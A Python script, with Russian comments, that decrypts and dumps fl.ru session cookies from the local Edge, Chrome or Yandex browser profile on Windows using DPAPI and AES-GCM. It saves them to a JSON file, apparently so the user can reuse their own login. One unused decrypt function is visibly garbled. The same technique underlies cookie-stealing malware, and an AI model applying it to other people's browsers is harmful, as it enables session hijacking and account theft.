"""Извлекает cookies fl.ru из Edge (или Chrome) — дешифровка v10 (DPAPI + AES-GCM).
Использование: python extract_fl_cookies.py [--browser edge|chrome]
Результат: JSON {name: value} для домена fl.ru, печатается и сохраняется в fl_cookies.json."""
import base64
import json
import os
import sqlite3
import sys
import shutil
import tempfile

try:
    from Cryptodome.Cipher import AES
except ImportError:
    try:
        from Crypto.Cipher import AES
    except ImportError:
        print("нужен pycryptodome: pip install pycryptodome")
        sys.exit(1)

import win32crypt
import win32api

LOCAL = os.environ.get("LOCALAPPDATA", "")


def chrome_paths(browser):
    if browser == "edge":
        root = os.path.join(LOCAL, "Microsoft", "Edge", "User Data")
    elif browser == "yandex":
        root = os.path.join(LOCAL, "Yandex", "YandexBrowser", "User Data")
    else:
        root = os.path.join(LOCAL, "Google", "Chrome", "User Data")
    cookies = os.path.join(root, "Default", "Network", "Cookies")
    state = os.path.join(root, "Local State")
    return cookies, state


def get_encryption_key(state_path):
    with open(state_path, "r", encoding="utf-8") as f:
        state = json.load(f)
    key_b64 = state["os_crypt"]["encrypted_key"]
    key = base64.b64decode(key_b64)
    key = key[5:]  # 'DPAPI' prefix
    return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]


def decrypt_value(encrypted, key):
    if encrypted[:3] == b"v10":
        nonce = encrypted[3:15]
        cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
        return cipher.decrypt_and_verify(encrypted[15:], encrypted[15:].__len__() and encrypted[-16:] if False else b"")
    # v10 stores tag in the ciphertext? Actually format: v10||nonce(12)||ct+tag(ct ends with 16-byte tag)
    return b""


def decrypt_value2(encrypted, key):
    if encrypted[:3] == b"v10":
        nonce = encrypted[3:15]
        ct = encrypted[15:]
        cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
        return cipher.decrypt_and_verify(ct[:-16], ct[-16:])
    if encrypted[:3] == b"v20":
        # app-bound: пробуем старый ключ
        nonce = encrypted[3:15]
        ct = encrypted[15:]
        cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
        try:
            return cipher.decrypt_and_verify(ct[:-16], ct[-16:])
        except Exception:
            return b""
    return win32crypt.CryptUnprotectData(encrypted, None, None, None, 0)[1]


def main():
    browser = sys.argv[1] if len(sys.argv) > 1 else "edge"
    cookies_path, state_path = chrome_paths(browser)
    if not os.path.exists(cookies_path):
        print(f"НЕТ БД куки: {cookies_path}")
        sys.exit(2)
    key = get_encryption_key(state_path)
    tmp = os.path.join(tempfile.gettempdir(), "cookies_copy.db")
    shutil.copy2(cookies_path, tmp)
    con = sqlite3.connect(tmp)
    rows = con.execute(
        "SELECT host_key, name, path, expires_utc, encrypted_value, is_httponly, is_secure, has_expires "
        "FROM cookies WHERE host_key LIKE '%fl.ru' AND name != ''").fetchall()
    con.close()
    out = {}
    for host, name, path, exp, ev, httponly, secure, has_expires in rows:
        try:
            val = decrypt_value2(ev, key).decode("utf-8")
        except Exception as e:
            print(f"  пропуск {name}: {e}")
            continue
        if not val:
            continue
        out[name] = val
        print(f"{name} = {val[:60]}{'...' if len(val) > 60 else ''}")
    if not out:
        print("Куки fl.ru не найдены — войдите на fl.ru в этом браузере и повторите.")
        sys.exit(3)
    with open("fl_cookies.json", "w", encoding="utf-8") as f:
        json.dump(out, f, ensure_ascii=False, indent=1)
    print(f"\nСохранено {len(out)} кук в fl_cookies.json")


if __name__ == "__main__":
    main()